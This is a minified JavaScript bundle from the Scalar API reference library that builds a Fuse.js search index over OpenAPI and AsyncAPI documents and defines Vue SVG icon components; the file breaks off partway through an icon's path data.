"use client";
import { i as __toESM } from "./rolldown-runtime-B-lAHAz2.js";
import { t as require_react } from "./react.js";
import { t as require_jsx_runtime } from "./react_jsx-runtime.js";
import { $ as ScalarButton_default, An as ScalarIconInfo_default, At as ScalarFloating_default, Cn as ScalarIcon_default, Ct as useLoadingState, D as isHidden, Dn as ScalarIconPlus_default, Dt as useFormGroup, E as slugger, Et as ScalarFormInput_default, Fn as ScalarIconCaretDown_default, Ft as useModal, G as ScalarCopy_default, Gn as isConfigurationWithSources, H as ScalarCodeBlock_default, Ht as o$1, I as Queue, In as useScalarIcon, J as ScalarMarkdownSummary_default, Jt as A, Kn as entry_default, Kt as f, Ln as useBindCx, Lt as N$2, Mn as ScalarIconCopy_default, Mt as isMacOS, N as createWorkspaceEventBus, Nn as ScalarIconCheck_default, Nt as ScalarSearchInput_default, Ot as ScalarListbox_default, Pn as ScalarIconCaretRight_default, Pt as ScalarModal_default, Qt as s, Rn as cva, Rt as Q, Sn as ScalarIconLegacyAdapter_default, St as watchDebounced, Tn as ScalarIconX_default, Tt as useToasts, U as prettyPrintJson, V as ScalarCombobox_default, Vn as getEnvironmentVariables, W as ScalarCodeBlockCopy_default, Wn as DEFAULT_MODELS_SECTION_LABEL, X as ServerVariablesForm_default, Xt as T, Y as ScalarMarkdown_default, Yt as N$1, bn as ScalarColorModeToggleButton_default, cn as i$1, ct as onKeyStroke, dn as i, dt as useElementHover, en as N, et as nanoid, fn as s$1, ft as useEventListener, gt as useScrollLock, ht as useIntersectionObserver, j as isNonOptionalSecurityRequirement, jt as ScalarListboxCheckbox_default, kn as ScalarIconMagnifyingGlass_default, kt as ScalarFloatingBackdrop_default, ln as u$1, mn as ScalarIconButton_default, n as ScalarPopover_default, nn as P, nt as debounce, ot as AuthSchema, pn as t, pt as useFavicon, q as ScalarCopyBackdrop_default, qt as u, r as AuthSelector_default, rn as T$1, st as onClickOutside, t as initializeWorkspaceEventHandlers, tn as O, tt as slugify, un as o, wn as _plugin_vue_export_helper_default, wt as ScalarToasts_default, xn as ScalarColorModeToggleIcon_default, xt as useTimeoutFn, yn as useColorMode, zt as V } from "./workspace-events-BHk-czww.js";
import { $r as getResolvedRefDeep, C as getDocumentType, Ci as isObject, E as isOpenApiDocument, G as buildRequest, Gr as isDynamicRef, H as objectEntries, Jr as escapeJsonPointer, Kr as pushDynamicScope, L as buildSafeBodyRequest, Lt as getXmlBodyExample, Qr as isStreamingContentType, Rt as getExampleFromSchema, S as getActiveEnvironment, Si as mergeSiblingReferences, T as isAsyncApiDocument, Xr as getExample, Yr as isDefined, Zr as serializeStreamExample, _i as isNumberSchema, bi as isStringSchema, ct as redirectToProxy, d as getSecurityRequirements, di as getExampleValue, dt as isLocalUrl, ei as unpackProxyObject, fi as getExplicitExampleText, ft as safeRun, g as getPathItemOperation, gt as REGEX, h as forEachPathItemOperation, hi as isArraySchema, i as mergeSecurity, ii as unpackDetectChangesProxy, l as getSecuritySchemes, li as parseJsonPointerSegments, mr as coerceValue, mt as replacePathVariables, n as getSelectedServer, nt as mergeUrls, o as deepClone, p as combineParams, pi as isXmlMediaType, pt as replaceEnvVariables, qr as resolveDynamicRef, r as getServers, s as getSelectedSecurity, tt as combineUrlAndPath, u as objectKeys, v as getResolvedPathItem, vi as isObjectSchema, vt as isHttpMethod, w as getDocumentTypeLabel, wi as isObjectLike, xi as getResolvedRef, yi as isSchema, zt as resolve } from "./request-example-CCgTHEb8.js";
import { _ as provideLocalization, a as apiReferenceConfigurationWithSourceSchema, b as _plugin_vue_export_helper_default$1, d as AGENT_CONTEXT_SYMBOL, f as useAgent, g as coerce, h as ScalarIconArrowUp_default, i as apiReferenceConfigurationSchema, l as REFERENCE_LS_KEYS, m as ScalarIconLockSimple_default, o as ScalarTextInputCopy_default, p as useAgentContext, r as useLazyApiClient, t as createWorkspaceStore, u as safeLocalStorage, v as resolveLocalization, y as useLocalization } from "./client-CDFj7Xt_.js";
import { $ as resolveDynamicComponent, A as guardReactiveProps, At as unref, B as onBeforeUnmount, C as createSlots, D as defineAsyncComponent, E as createVNode, Et as toRef, F as mergeModels, Ft as normalizeStyle, G as onServerPrefetch, H as onDeactivated, I as mergeProps, It as toDisplayString, J as openBlock, K as onUnmounted, L as nextTick, M as hasInjectionContext, N as inject, Nt as normalizeClass, O as defineComponent, Ot as toValue, Pt as normalizeProps$1, Q as resolveComponent, R as onActivated, St as shallowReactive, T as createTextVNode, Tt as toRaw, W as onMounted, X as renderList, Y as provide, Z as renderSlot, _ as computed, at as useTemplateRef, b as createCommentVNode, d as withKeys, dt as withDirectives, et as toHandlers, f as withModifiers, gt as isRef, j as h, k as getCurrentInstance, l as vModelText, m as Fragment, mt as getCurrentScope, n as createApp, nt as useId, o as vModelCheckbox, ot as watch, r as createSSRApp, rt as useModel, s as vModelDynamic, st as watchEffect, u as vShow, ut as withCtx, v as createBaseVNode, vt as onScopeDispose, w as createStaticVNode, wt as shallowRef, x as createElementBlock, xt as ref, y as createBlock, yt as reactive, z as onBeforeMount } from "./vue.runtime.esm-bundler-BqKG0iLx.js";
import { B as ScalarIconBook_default, C as i$2, D as n, E as t$1, F as ScalarSidebarFooter_default, H as filterItems, I as ScalarSidebarButton_default, L as ScalarWrappingText_default, M as ScalarSidebarSection_default, O as useClipboard, P as ScalarSidebarSearchButton_default, R as ScalarIconWebhooksLogo_default, S as r, T as r$1, U as HttpMethod_default$1, V as ScalarIconArrowUpRight_default, W as getHttpMethodInfo, _ as ScalarCardFooter_default, b as t$2, c as n$1, d as useExternalExamples, g as ScalarCardHeader_default, h as ScalarVirtualText_default, i as parseJsonOrYaml, j as ScalarSidebar_default, k as createSidebarState, l as EXTERNAL_EXAMPLES, m as freezeElement, o as mapHiddenClientsConfig, r as OpenApiClientButton_default, s as ScalarErrorBoundary_default, t as addScalarClassesToHeadless, u as useExampleVisibility, v as ScalarCardSection_default, w as n$2, x as i$3, y as ScalarCard_default, z as ScalarIconEnvelopeSimple_default } from "./add-scalar-classes-B9nZH9kB.js";
import { a as textFromNode, i as splitContent, r as isHeading, t as getHeadings } from "./markdown-BYX4EdmX.js";
//#region node_modules/@scalar/api-reference/dist/helpers/openapi.js
var isSchemaObject$1 = (value) => typeof value === "object" && value !== null;
/**
* Resolves a schema reference from workspace-store to a SchemaObject.
* Returns undefined when a reference exists but has not been resolved yet.
*/
function resolveSchemaRef(ref) {
	if (typeof ref === "object" && ref !== null && "$ref" in ref) return isSchemaObject$1(ref["$ref-value"]) ? ref["$ref-value"] : void 0;
	return ref;
}
function pushUnique(target, value) {
	if (!value) return;
	if (!target.includes(value)) target.push(value);
}
/**
* Recursively visits every property of a schema, descending transparently through composition
* keywords (`oneOf`, `anyOf`, `allOf`) and one level into nested object properties.
*
* Composition is treated as transparent — a `oneOf` of two object variants is *the same level* as a
* single object, just expressed as multiple shapes. Property nesting is capped to keep the index
* focused on shallow, commonly-searched fields. A visited-set keyed by resolved-schema identity
* guards against recursive (`Tree → Tree`) schemas.
*/
function collectSchemaProperties(schema, options, propertyDepth = 0) {
	if (!schema || options.visited.has(schema)) return;
	options.visited.add(schema);
	[
		...schema.oneOf ?? [],
		...schema.anyOf ?? [],
		...schema.allOf ?? []
	].forEach((variantRef) => {
		collectSchemaProperties(resolveSchemaRef(variantRef), options, propertyDepth);
	});
	if (isObjectSchema(schema) && schema.properties) Object.entries(schema.properties).forEach(([key, propRef]) => {
		const property = resolveSchemaRef(propRef);
		options.visit(key, property);
		if (propertyDepth + 1 < options.maxPropertyDepth) collectSchemaProperties(property, options, propertyDepth + 1);
	});
}
/**
* Walks the request body schemas of an operation and yields each property schema with its key.
*/
function forEachRequestBodyProperty(operation, visit) {
	const content = getResolvedRef(operation?.requestBody)?.content;
	if (!content) return;
	const visited = /* @__PURE__ */ new Set();
	Object.values(content).forEach((media) => {
		collectSchemaProperties(getResolvedRef(getResolvedRef(media)?.schema), {
			visit,
			visited,
			maxPropertyDepth: 2
		});
	});
}
/**
* Extracts the names of every parameter on an operation.
*
* The returned strings contain only parameter names (e.g. `userId`, `limit`) so they can be indexed
* as a high-signal field for search. Filter-style metadata like `REQUIRED`, `optional`, `query` and
* the schema type are intentionally excluded — those tokens dilute fuzzy matches and produce false
* positives for queries like `query` or `integer`.
*/
function extractParameterNames(parameters) {
	const names = [];
	parameters.forEach((parameter) => {
		const resolved = getResolvedRef(parameter);
		pushUnique(names, resolved?.name);
	});
	return names;
}
/**
* Extracts the descriptions of every parameter on an operation.
*
* Kept separate from parameter names so the search index can weight each independently.
*/
function extractParameterDescriptions(parameters) {
	const descriptions = [];
	parameters.forEach((parameter) => {
		const resolved = getResolvedRef(parameter);
		pushUnique(descriptions, resolved?.description);
	});
	return descriptions;
}
/**
* Extracts the names of properties from the request body schema(s) of an operation.
*
* Walks every media type and includes both top-level and one level of nested property names so
* common fields like `email` or `username` surface in search regardless of how the body is shaped.
*/
function extractBodyFieldNames(operation) {
	const names = [];
	forEachRequestBodyProperty(operation, (key) => {
		pushUnique(names, key);
	});
	return names;
}
/**
* Extracts the descriptions of properties from the request body schema(s) of an operation.
*/
function extractBodyDescriptions(operation) {
	const descriptions = [];
	forEachRequestBodyProperty(operation, (_key, schema) => {
		if (schema && "description" in schema && typeof schema.description === "string") pushUnique(descriptions, schema.description);
	});
	return descriptions;
}
/**
* Extracts the property names of a schema for the search index.
*
* Same depth and composition behavior as `extractBodyFieldNames` — descends transparently through
* `oneOf`/`anyOf`/`allOf`, walks one level into nested object properties, dedupes.
*/
function extractSchemaFieldNames(schema) {
	const names = [];
	collectSchemaProperties(schema, {
		visit: (key) => pushUnique(names, key),
		visited: /* @__PURE__ */ new Set(),
		maxPropertyDepth: 2
	});
	return names;
}
/**
* Extracts the property descriptions of a schema for the search index.
*/
function extractSchemaDescriptions(schema) {
	const descriptions = [];
	collectSchemaProperties(schema, {
		visit: (_key, propertySchema) => {
			if (propertySchema && "description" in propertySchema && typeof propertySchema.description === "string") pushUnique(descriptions, propertySchema.description);
		},
		visited: /* @__PURE__ */ new Set(),
		maxPropertyDepth: 2
	});
	return descriptions;
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/helpers/create-fuse-instance.js
/**
* Create a Fuse instance for searching the API reference.
*
* Doesn't have any data yet, so it's empty.
*/
function createFuseInstance() {
	return new entry_default([], {
		keys: [
			{
				name: "title",
				weight: .7
			},
			{
				name: "operationId",
				weight: .6
			},
			{
				name: "parameters",
				weight: .55
			},
			{
				name: "body",
				weight: .55
			},
			{
				name: "path",
				weight: .5
			},
			{
				name: "tag",
				weight: .4
			},
			{
				name: "description",
				weight: .3
			},
			{
				name: "method",
				weight: .3
			},
			{
				name: "responseExamples",
				weight: .25
			},
			{
				name: "parameterDescriptions",
				weight: .2
			},
			{
				name: "bodyDescriptions",
				weight: .2
			}
		],
		threshold: .3,
		distance: 100,
		includeScore: true,
		includeMatches: true,
		ignoreLocation: true,
		useExtendedSearch: true,
		findAllMatches: true
	});
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/get-async-api-message-payload-schema.js
/**
* A resolved schema-bearing value may be a JSON Schema object, a boolean (`true`/`false`)
* schema, or a Multi Format Schema wrapper, so accept only plain objects and treat them as the
* `SchemaObject` the shared Schema/Model rendering expects.
*/
var isSchemaObject = (value) => isObject(value);
/**
* Unwraps an AsyncAPI schema-bearing value into the `SchemaObject` shape the shared OpenAPI
* `Schema`/`Model` components expect.
*
* AsyncAPI reuses JSON Schema, but a value may need extra handling:
* - The value itself may be a `$ref`; it is resolved to its `$ref-value`.
* - A Multi Format Schema Object (`schemaFormat` plus a nested `schema`) is unwrapped to its
*   payload, so we render the inner JSON Schema rather than the wrapper.
* - Boolean (`true`/`false`) and non-JSON-Schema payloads are skipped.
*/
var unwrapAsyncApiSchema = (value) => {
	if (value === void 0) return;
	const resolved = getResolvedRef(value);
	const schema = isObject(resolved) && "schemaFormat" in resolved ? getResolvedRef(resolved.schema) : resolved;
	return isSchemaObject(schema) ? schema : void 0;
};
/** Resolves an AsyncAPI message `payload` into the `SchemaObject` the shared Schema component expects. */
var getAsyncApiMessagePayloadSchema = (message) => unwrapAsyncApiSchema(message.payload);
/** Resolves an AsyncAPI message `headers` into the `SchemaObject` the shared Schema component expects. */
var getAsyncApiMessageHeadersSchema = (message) => unwrapAsyncApiSchema(message.headers);
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/get-async-api-model-schema.js
/**
* Resolves a named schema from an AsyncAPI document's `components.schemas` into the `SchemaObject`
* shape the shared OpenAPI Model components and search indexing expect.
*
* AsyncAPI keeps reusable schemas in the same place OpenAPI does, but an entry may need extra handling:
* - `components` or the schema itself may be a `$ref`; siblings are merged so keys declared alongside
*   a `$ref` are kept rather than dropped.
* - A Multi Format Schema Object (`schemaFormat` plus a nested `schema`) is unwrapped to its payload,
*   so we index and render the inner JSON Schema rather than the wrapper.
* - Boolean (`true`/`false`) and non-JSON-Schema payloads are skipped.
*/
var getAsyncApiModelSchema = (document, name) => {
	if (!document.components) return;
	const entry = getResolvedRef(document.components, mergeSiblingReferences).schemas?.[name];
	return unwrapAsyncApiSchema(entry);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/is-introduction-entry.js
/**
* Whether a navigation entry is the auto-generated introduction section.
*
* We match on the stable entry id instead of the English title so localization does not accidentally
* rewrite unrelated description headings that happen to be called "Introduction".
*/
var isIntroductionEntry = (entry) => entry.type === "text" && typeof entry.id === "string" && entry.id.endsWith("/description/introduction");
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/helpers/create-search-index.js
/**
* Resolves a schema from `components.schemas` for either document type.
*
* OpenAPI and AsyncAPI keep reusable schemas in the same place, so model search entries can read
* property names and descriptions from both. AsyncAPI entries need extra handling (ref siblings,
* multi-format wrappers, boolean schemas), which lives in {@link getAsyncApiModelSchema}.
*/
function getModelSchema(document, name) {
	if (isOpenApiDocument(document)) return getResolvedRef(document.components?.schemas?.[name]);
	if (isAsyncApiDocument(document)) return getAsyncApiModelSchema(document, name);
}
function responseExampleValueToString(value) {
	if (typeof value === "string") return value;
	try {
		return JSON.stringify(value);
	} catch (_error) {
		return "";
	}
}
function mediaTypeExamplesToStrings(mediaType) {
	const examplesFromNamedMap = Object.values(mediaType.examples ?? {}).flatMap((example) => {
		const resolvedExample = getResolvedRef(example);
		if (!resolvedExample || !("value" in resolvedExample)) return [];
		return responseExampleValueToString(resolvedExample.value);
	}).filter((value) => value.length > 0);
	const mediaTypeExample = "example" in mediaType && mediaType.example !== void 0 ? responseExampleValueToString(mediaType.example) : "";
	return mediaTypeExample ? [mediaTypeExample, ...examplesFromNamedMap] : examplesFromNamedMap;
}
function extractResponseExamples(responses) {
	if (!responses) return [];
	return Object.values(responses).flatMap((response) => {
		const resolvedResponse = getResolvedRef(response);
		if (!resolvedResponse?.content) return [];
		return Object.values(resolvedResponse.content).flatMap((mediaType) => {
			const resolvedMediaType = getResolvedRef(mediaType);
			if (!resolvedMediaType) return [];
			return mediaTypeExamplesToStrings(resolvedMediaType);
		});
	}).filter((value) => value.length > 0);
}
var DEFAULT_SEARCH_INDEX_LABELS = {
	heading: "Heading",
	tagGroup: "Tag Group",
	webhook: "Webhook",
	webhooks: "Webhooks",
	introduction: "Introduction"
};
/**
* Create a search index from a list of entries.
*/
function createSearchIndex(document, options) {
	const index = [];
	const modelsSectionTitle = options?.modelsSectionLabel ?? "Models";
	const labels = options?.labels ?? DEFAULT_SEARCH_INDEX_LABELS;
	/**
	* Recursively processes entries and their children to build the search index.
	*/
	function processEntries(entriesToProcess) {
		entriesToProcess.forEach((entry) => {
			addEntryToIndex(entry, index, document, modelsSectionTitle, labels);
			if ("children" in entry && entry.children) processEntries(entry.children);
		});
	}
	processEntries(document?.["x-scalar-navigation"]?.children ?? []);
	return index;
}
/**
* Adds a single entry to the search index, handling all entry types recursively.
*
* AsyncAPI documents contribute heading, tag, and model entries here. Their
* channels, operations, and messages are not indexed yet.
*/
function addEntryToIndex(entry, index, document, modelsSectionTitle, labels) {
	const openApiDocument = isOpenApiDocument(document) ? document : void 0;
	if (entry.type === "operation") {
		const pathItem = getResolvedPathItem(openApiDocument?.paths?.[entry.path]);
		const operation = getResolvedRef(getPathItemOperation(openApiDocument?.paths?.[entry.path], entry.method)) ?? {};
		const operationWithPathParams = {
			...operation,
			parameters: combineParams(pathItem?.parameters, operation.parameters)
		};
		const parameters = extractParameterNames(operationWithPathParams.parameters ?? []);
		const parameterDescriptions = extractParameterDescriptions(operationWithPathParams.parameters ?? []);
		const body = extractBodyFieldNames(operationWithPathParams);
		const bodyDescriptions = extractBodyDescriptions(operationWithPathParams);
		const responseExamples = extractResponseExamples(operationWithPathParams.responses);
		index.push({
			type: "operation",
			title: entry.title,
			id: entry.id,
			description: operationWithPathParams.description || "",
			method: entry.method,
			path: entry.path,
			body,
			bodyDescriptions,
			parameters,
			parameterDescriptions,
			responseExamples,
			operationId: operationWithPathParams.operationId,
			entry
		});
		return;
	}
	if (entry.type === "webhook") {
		const webhook = getResolvedRef(getPathItemOperation(openApiDocument?.webhooks?.[entry.name], entry.method)) ?? {};
		const webhookDescription = webhook.description || "";
		index.push({
			id: entry.id,
			type: "webhook",
			title: entry.title,
			description: "Webhook",
			method: entry.method,
			body: "",
			bodyDescriptions: webhookDescription ? [webhookDescription] : [],
			operationId: webhook.operationId,
			entry
		});
		return;
	}
	if (entry.type === "model") {
		const schema = getModelSchema(document, entry.name);
		const schemaDescription = schema?.description ?? "";
		const propertyNames = extractSchemaFieldNames(schema);
		const propertyDescriptions = extractSchemaDescriptions(schema);
		index.push({
			type: "model",
			title: entry.title,
			description: modelsSectionTitle,
			id: entry.id,
			body: propertyNames,
			bodyDescriptions: schemaDescription ? [schemaDescription, ...propertyDescriptions] : propertyDescriptions,
			entry
		});
		return;
	}
	if (entry.type === "models") {
		index.push({
			id: entry.id,
			type: "heading",
			title: modelsSectionTitle,
			description: labels.heading,
			body: "",
			entry
		});
		return;
	}
	if (entry.type === "tag" && entry.isWebhooks === true) {
		index.push({
			id: entry.id,
			type: "heading",
			title: labels.webhooks,
			description: labels.heading,
			body: "",
			entry
		});
		return;
	}
	if (entry.type === "tag" && entry.isTagGroup !== true) {
		index.push({
			id: entry.id,
			title: entry.title,
			description: entry.description || "",
			type: "tag",
			body: "",
			entry
		});
		return;
	}
	if (entry.type === "tag" && entry.isTagGroup === true) {
		index.push({
			id: entry.id,
			title: entry.title,
			description: labels.tagGroup,
			type: "tag",
			body: "",
			entry
		});
		return;
	}
	if (entry.type === "text") {
		index.push({
			id: entry.id,
			type: "heading",
			title: isIntroductionEntry(entry) ? labels.introduction : entry.title ?? "",
			description: labels.heading,
			body: "",
			entry
		});
		return;
	}
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/hooks/useSearchIndex.js
var MAX_SEARCH_RESULTS = 25;
/**
* Creates the search index from an OpenAPI or AsyncAPI document.
*/
function useSearchIndex(document, modelsSectionLabel = DEFAULT_MODELS_SECTION_LABEL, labels = {
	heading: "Heading",
	tagGroup: "Tag Group",
	webhook: "Webhook",
	webhooks: "Webhooks",
	introduction: "Introduction"
}) {
	const searchIndex = computed(() => createSearchIndex(toValue(document), {
		labels: toValue(labels),
		modelsSectionLabel: toValue(modelsSectionLabel) ?? "Models"
	}));
	/** When the document changes we replace the search index */
	const fuse = computed(() => {
		const instance = createFuseInstance();
		instance.setCollection(searchIndex.value);
		return instance;
	});
	const query = ref("");
	return {
		results: computed(() => {
			if (query.value.length !== 0) return fuse.value.search(query.value, { limit: MAX_SEARCH_RESULTS });
			return searchIndex.value.slice(0, MAX_SEARCH_RESULTS).map((item, index) => ({
				item,
				refIndex: index
			}));
		}),
		query
	};
}
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconBookOpen.vue.script.js
var _hoisted_1$125 = { key: 0 };
var _hoisted_2$87 = { key: 1 };
var _hoisted_3$68 = { key: 2 };
var _hoisted_4$51 = { key: 3 };
var _hoisted_5$41 = { key: 4 };
var _hoisted_6$36 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconBookOpen.js
var ScalarIconBookOpen_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconBookOpen",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$125, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M232,44H160a43.86,43.86,0,0,0-32,13.85A43.86,43.86,0,0,0,96,44H24A12,12,0,0,0,12,56V200a12,12,0,0,0,12,12H96a20,20,0,0,1,20,20,12,12,0,0,0,24,0,20,20,0,0,1,20-20h72a12,12,0,0,0,12-12V56A12,12,0,0,0,232,44ZM96,188H36V68H96a20,20,0,0,1,20,20V192.81A43.79,43.79,0,0,0,96,188Zm124,0H160a43.71,43.71,0,0,0-20,4.83V88a20,20,0,0,1,20-20h60Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$87, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M232,56V200H160a32,32,0,0,0-32,32,32,32,0,0,0-32-32H24V56H96a32,32,0,0,1,32,32,32,32,0,0,1,32-32Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M232,48H160a40,40,0,0,0-32,16A40,40,0,0,0,96,48H24a8,8,0,0,0-8,8V200a8,8,0,0,0,8,8H96a24,24,0,0,1,24,24,8,8,0,0,0,16,0,24,24,0,0,1,24-24h72a8,8,0,0,0,8-8V56A8,8,0,0,0,232,48ZM96,192H32V64H96a24,24,0,0,1,24,24V200A39.81,39.81,0,0,0,96,192Zm128,0H160a39.81,39.81,0,0,0-24,8V88a24,24,0,0,1,24-24h64Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$68, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M240,56V200a8,8,0,0,1-8,8H160a24,24,0,0,0-24,23.94,7.9,7.9,0,0,1-5.12,7.55A8,8,0,0,1,120,232a24,24,0,0,0-24-24H24a8,8,0,0,1-8-8V56a8,8,0,0,1,8-8H88a32,32,0,0,1,32,32v87.73a8.17,8.17,0,0,0,7.47,8.25,8,8,0,0,0,8.53-8V80a32,32,0,0,1,32-32h64A8,8,0,0,1,240,56Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$51, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M232,50H160a38,38,0,0,0-32,17.55A38,38,0,0,0,96,50H24a6,6,0,0,0-6,6V200a6,6,0,0,0,6,6H96a26,26,0,0,1,26,26,6,6,0,0,0,12,0,26,26,0,0,1,26-26h72a6,6,0,0,0,6-6V56A6,6,0,0,0,232,50ZM96,194H30V62H96a26,26,0,0,1,26,26V204.31A37.86,37.86,0,0,0,96,194Zm130,0H160a37.87,37.87,0,0,0-26,10.32V88a26,26,0,0,1,26-26h66Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$41, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M232,48H160a40,40,0,0,0-32,16A40,40,0,0,0,96,48H24a8,8,0,0,0-8,8V200a8,8,0,0,0,8,8H96a24,24,0,0,1,24,24,8,8,0,0,0,16,0,24,24,0,0,1,24-24h72a8,8,0,0,0,8-8V56A8,8,0,0,0,232,48ZM96,192H32V64H96a24,24,0,0,1,24,24V200A39.81,39.81,0,0,0,96,192Zm128,0H160a39.81,39.81,0,0,0-24,8V88a24,24,0,0,1,24-24h64Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$36, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M232,52H160a36,36,0,0,0-32,19.54A36,36,0,0,0,96,52H24a4,4,0,0,0-4,4V200a4,4,0,0,0,4,4H96a28,28,0,0,1,28,28,4,4,0,0,0,8,0,28,28,0,0,1,28-28h72a4,4,0,0,0,4-4V56A4,4,0,0,0,232,52ZM96,196H28V60H96a28,28,0,0,1,28,28V209.4A35.93,35.93,0,0,0,96,196Zm132,0H160a35.94,35.94,0,0,0-28,13.41V88a28,28,0,0,1,28-28h68Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconBracketsCurly.vue.script.js
var _hoisted_1$124 = { key: 0 };
var _hoisted_2$86 = { key: 1 };
var _hoisted_3$67 = { key: 2 };
var _hoisted_4$50 = { key: 3 };
var _hoisted_5$40 = { key: 4 };
var _hoisted_6$35 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconBracketsCurly.js
var ScalarIconBracketsCurly_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconBracketsCurly",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$124, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M54.8,119.49A35.06,35.06,0,0,1,49.05,128a35.06,35.06,0,0,1,5.75,8.51C60,147.24,60,159.83,60,172c0,25.94,1.84,32,20,32a12,12,0,0,1,0,24c-19.14,0-32.2-6.9-38.8-20.51C36,196.76,36,184.17,36,172c0-25.94-1.84-32-20-32a12,12,0,0,1,0-24c18.16,0,20-6.06,20-32,0-12.17,0-24.76,5.2-35.49C47.8,34.9,60.86,28,80,28a12,12,0,0,1,0,24c-18.16,0-20,6.06-20,32C60,96.17,60,108.76,54.8,119.49ZM240,116c-18.16,0-20-6.06-20-32,0-12.17,0-24.76-5.2-35.49C208.2,34.9,195.14,28,176,28a12,12,0,0,0,0,24c18.16,0,20,6.06,20,32,0,12.17,0,24.76,5.2,35.49A35.06,35.06,0,0,0,207,128a35.06,35.06,0,0,0-5.75,8.51C196,147.24,196,159.83,196,172c0,25.94-1.84,32-20,32a12,12,0,0,0,0,24c19.14,0,32.2-6.9,38.8-20.51C220,196.76,220,184.17,220,172c0-25.94,1.84-32,20-32a12,12,0,0,0,0-24Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$86, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M240,128c-64,0,0,88-64,88H80c-64,0,0-88-64-88,64,0,0-88,64-88h96C240,40,176,128,240,128Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M43.18,128a29.78,29.78,0,0,1,8,10.26c4.8,9.9,4.8,22,4.8,33.74,0,24.31,1,36,24,36a8,8,0,0,1,0,16c-17.48,0-29.32-6.14-35.2-18.26-4.8-9.9-4.8-22-4.8-33.74,0-24.31-1-36-24-36a8,8,0,0,1,0-16c23,0,24-11.69,24-36,0-11.72,0-23.84,4.8-33.74C50.68,38.14,62.52,32,80,32a8,8,0,0,1,0,16C57,48,56,59.69,56,84c0,11.72,0,23.84-4.8,33.74A29.78,29.78,0,0,1,43.18,128ZM240,120c-23,0-24-11.69-24-36,0-11.72,0-23.84-4.8-33.74C205.32,38.14,193.48,32,176,32a8,8,0,0,0,0,16c23,0,24,11.69,24,36,0,11.72,0,23.84,4.8,33.74a29.78,29.78,0,0,0,8,10.26,29.78,29.78,0,0,0-8,10.26c-4.8,9.9-4.8,22-4.8,33.74,0,24.31-1,36-24,36a8,8,0,0,0,0,16c17.48,0,29.32-6.14,35.2-18.26,4.8-9.9,4.8-22,4.8-33.74,0-24.31,1-36,24-36a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$67, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M216,40H40A16,16,0,0,0,24,56V200a16,16,0,0,0,16,16H216a16,16,0,0,0,16-16V56A16,16,0,0,0,216,40ZM88,155.84c.29,14.26.41,20.16,16,20.16a8,8,0,0,1,0,16c-31.27,0-31.72-22.43-32-35.84C71.71,141.9,71.59,136,56,136a8,8,0,0,1,0-16c15.59,0,15.71-5.9,16-20.16C72.28,86.43,72.73,64,104,64a8,8,0,0,1,0,16c-15.59,0-15.71,5.9-16,20.16-.17,8.31-.41,20.09-8,27.84C87.59,135.75,87.83,147.53,88,155.84ZM200,136c-15.59,0-15.71,5.9-16,20.16-.28,13.41-.73,35.84-32,35.84a8,8,0,0,1,0-16c15.59,0,15.71-5.9,16-20.16.17-8.31.41-20.09,8-27.84-7.6-7.75-7.84-19.53-8-27.84C167.71,85.9,167.59,80,152,80a8,8,0,0,1,0-16c31.27,0,31.72,22.43,32,35.84.29,14.26.41,20.16,16,20.16a8,8,0,0,1,0,16Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$50, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: 